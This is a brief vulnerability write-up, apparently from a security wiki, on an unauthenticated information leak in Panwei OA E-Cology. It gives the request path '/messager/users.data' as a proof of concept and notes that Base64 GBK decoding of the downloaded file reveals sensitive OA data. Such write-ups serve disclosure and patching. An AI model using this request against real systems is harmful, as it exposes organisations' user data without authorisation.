# Panwei OA E-Cology users.data Sensitive information leakage

## Vulnerability Description

Panwei OA E-Cology users.data allows any user to download and obtain sensitive information in OA.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Panwei OA E-Cology</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1636962061131-2d870e8d-e15c-4864-8d36-69bd1f57d746-20220313184604856.png)

Verify POC

```php
/messager/users.data
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1646043440450-c69abe9a-4e26-4d92-b059-4e1e74139dc8.png)



Base64 GBK decoding can obtain sensitive data in OA